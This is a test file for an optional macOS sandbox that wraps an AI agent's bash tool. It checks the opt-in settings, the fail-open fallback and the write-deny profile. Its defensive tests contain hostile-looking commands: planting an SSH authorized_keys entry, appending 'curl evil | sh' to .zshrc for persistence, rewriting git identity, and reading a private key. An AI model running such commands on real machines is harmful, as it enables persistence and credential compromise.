import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { SANDBOX_PROFILE_PATH, bashInvocation } from "../../src/tools/sandbox.js";

/**
 * The OPTIONAL macOS sandbox for model-directed `bash`.
 *
 * Defense in depth, off by default, and NOT the containment boundary — that is
 * `tool:before`. The tests below are written to make that status hard to misread: the
 * default is off, an unavailable sandbox fails OPEN, and the profile is a deny-list.
 * A reader who mistakes this for the boundary would be relying on a layer that can
 * silently be absent.
 */

const ON = { HARNESS_BASH_SANDBOX: "1" };
const DARWIN = { platform: "darwin", home: "/Users/dev", exists: () => true } as const;

describe("off by default", () => {
  it("runs plain bash when the variable is unset", () => {
    expect(bashInvocation("ls", { env: {} })).toEqual({ bin: "bash", args: ["-lc", "ls"] });
  });

  for (const value of ["", "0", "false", "no", "off", "maybe"]) {
    it(`treats HARNESS_BASH_SANDBOX="${value}" as off`, () => {
      const invocation = bashInvocation("ls", { env: { HARNESS_BASH_SANDBOX: value }, ...DARWIN });

      // Only an explicit opt-in enables it. A typo'd value must not half-enable a
      // security-adjacent feature, in either direction.
      expect(invocation.bin).toBe("bash");
      expect(invocation.unavailable).toBeUndefined();
    });
  }

  for (const value of ["1", "true", "yes", "TRUE", " 1 "]) {
    it(`treats HARNESS_BASH_SANDBOX="${value}" as on`, () => {
      expect(bashInvocation("ls", { env: { HARNESS_BASH_SANDBOX: value }, ...DARWIN }).bin).toBe(
        "/usr/bin/sandbox-exec",
      );
    });
  }
});

describe("when enabled and available", () => {
  it("wraps bash in sandbox-exec with the profile and parameters", () => {
    const { bin, args } = bashInvocation("make test", { env: ON, ...DARWIN });

    expect(bin).toBe("/usr/bin/sandbox-exec");
    expect(args).toEqual([
      "-f",
      SANDBOX_PROFILE_PATH,
      "-D",
      "HOME=/Users/dev",
      "-D",
      "STORE_DIR=/Users/dev/.local/state/clawdparty/sessions",
      "/bin/bash",
      "-lc",
      "make test",
    ]);
  });

  it("parameterises the store dir from HARNESS_STORE_DIR", () => {
    const { args } = bashInvocation("ls", {
      env: { ...ON, HARNESS_STORE_DIR: "/srv/records" },
      ...DARWIN,
    });

    // The profile denies writes to the store. Hardcoding the default would leave a
    // relocated store unprotected while the profile still claimed to cover it.
    expect(args).toContain("STORE_DIR=/srv/records");
  });

  it("keeps the command as a standalone final argument", () => {
    const command = "echo 'hello world'; rm -rf /tmp/nope";
    const { args } = bashInvocation(command, { env: ON, ...DARWIN });

    // The security property the wrapper must not weaken: the command is one array
    // element, never spliced into the invocation.
    expect(args.at(-1)).toBe(command);
    expect(args.at(-2)).toBe("-lc");
    expect(args.filter((a) => a.includes("rm -rf"))).toHaveLength(1);
  });
});

describe("fails OPEN when requested but unavailable", () => {
  it("runs unsandboxed on a non-darwin platform, and says why", () => {
    const invocation = bashInvocation("ls", { env: ON, platform: "linux", exists: () => true });

    // sandbox-exec is macOS-only. Refusing all bash on Linux to protect nothing would
    // break the product for a layer documented as optional.
    expect(invocation.bin).toBe("bash");
    expect(invocation.unavailable).toContain("macOS-only");
    expect(invocation.unavailable).toContain("linux");
  });

  it("runs unsandboxed when sandbox-exec is missing, and says why", () => {
    const invocation = bashInvocation("ls", {
      env: ON,
      platform: "darwin",
      exists: (p) => p !== "/usr/bin/sandbox-exec",
    });

    expect(invocation.bin).toBe("bash");
    expect(invocation.unavailable).toContain("/usr/bin/sandbox-exec");
  });

  it("runs unsandboxed when the profile is missing, and says why", () => {
    const invocation = bashInvocation("ls", {
      env: ON,
      platform: "darwin",
      exists: (p) => p === "/usr/bin/sandbox-exec",
    });

    expect(invocation.bin).toBe("bash");
    expect(invocation.unavailable).toContain("profile is missing");
  });

  it("never reports unavailable when the sandbox was not requested", () => {
    // A message about a sandbox nobody asked for is noise that trains people to
    // ignore the warning that matters.
    expect(bashInvocation("ls", { env: {}, platform: "linux" }).unavailable).toBeUndefined();
  });
});

describe("the shipped profile", () => {
  it("exists where the code expects it", () => {
    expect(existsSync(SANDBOX_PROFILE_PATH)).toBe(true);
  });

  it("is a deny-list over an allow-default, and says so", () => {
    const profile = execFileSync("cat", [SANDBOX_PROFILE_PATH], { encoding: "utf8" });

    // `(allow default)` is what makes this a weaker layer than it might look. The
    // profile must state that, because a reader who assumes allow-list semantics would
    // over-trust it.
    expect(profile).toMatch(/\(allow default\)/);
    expect(profile).toMatch(/DEFENSE IN DEPTH, NOT THE BOUNDARY/);
    expect(profile).toMatch(/tool:before/);
  });

  it("denies writes to credentials while leaving them readable", () => {
    const profile = execFileSync("cat", [SANDBOX_PROFILE_PATH], { encoding: "utf8" });

    // Read must stay allowed: ssh reads the private key to authenticate a push
    // and discovery reads these paths by design. Only modification
    // is never legitimate.
    for (const dir of [".ssh", ".aws", ".claude", ".codex", ".gnupg"]) {
      expect(profile).toContain(`"/${dir}"`);
    }
    expect(profile).not.toMatch(/\(deny file-read\*/);
  });

  it("denies writes to the store, git identity, and persistence points", () => {
    const profile = execFileSync("cat", [SANDBOX_PROFILE_PATH], { encoding: "utf8" });

    expect(profile).toContain('(param "STORE_DIR")');
    expect(profile).toContain(".gitconfig");
    expect(profile).toContain("LaunchAgents");
    expect(profile).toContain(".zshrc");
  });
});

// The profile is only meaningful if macOS actually enforces it. Skipped elsewhere.
const onMac = process.platform === "darwin" && existsSync("/usr/bin/sandbox-exec");

describe.runIf(onMac)("real enforcement on this host", () => {
  let home: string;
  let store: string;

  beforeEach(() => {
    home = realpathSync(mkdtempSync(join(tmpdir(), "harness-sb-home-")));
    store = join(home, "store");
    mkdirSync(join(home, ".ssh"), { recursive: true });
    mkdirSync(store, { recursive: true });
    writeFileSync(join(home, ".ssh", "id_ed25519"), "PRIVATE-KEY-PLACEHOLDER\n");
  });
  afterEach(() => rmSync(home, { recursive: true, force: true }));

  function underSandbox(script: string): { code: number; out: string } {
    const { args } = bashInvocation(script, {
      env: { ...ON, HARNESS_STORE_DIR: store },
      platform: "darwin",
      home,
      exists: existsSync,
    });
    try {
      const out = execFileSync("/usr/bin/sandbox-exec", args, { encoding: "utf8", stdio: "pipe" });
      return { code: 0, out };
    } catch (err) {
      const e = err as { status?: number; stderr?: string; stdout?: string };
      return { code: e.status ?? 1, out: `${e.stdout ?? ""}${e.stderr ?? ""}` };
    }
  }

  it("permits an ordinary write, so the profile is not simply refusing everything", () => {
    const result = underSandbox(`echo ok > ${join(home, "scratch.txt")} && echo WROTE`);

    expect(result.out).toContain("WROTE");
  });

  it("BLOCKS a write into ~/.ssh", () => {
    const result = underSandbox(`echo pwned > ${join(home, ".ssh", "authorized_keys")}`);

    expect(result.code).not.toBe(0);
    expect(result.out).toMatch(/not permitted/i);
  });

  it("still allows READING a private key, which a push needs", () => {
    const result = underSandbox(`cat ${join(home, ".ssh", "id_ed25519")}`);

    expect(result.code).toBe(0);
    expect(result.out).toContain("PRIVATE-KEY-PLACEHOLDER");
  });

  it("BLOCKS a write into the harness store", () => {
    const result = underSandbox(`echo tamper > ${join(store, "entries.db")}`);

    expect(result.code).not.toBe(0);
  });

  it("BLOCKS writing a shell rc file, the persistence case", () => {
    const result = underSandbox(`echo 'curl evil | sh' >> ${join(home, ".zshrc")}`);

    expect(result.code).not.toBe(0);
  });

  it("BLOCKS rewriting git identity", () => {
    const result = underSandbox(`echo '[user]' > ${join(home, ".gitconfig")}`);

    expect(result.code).not.toBe(0);
  });
});
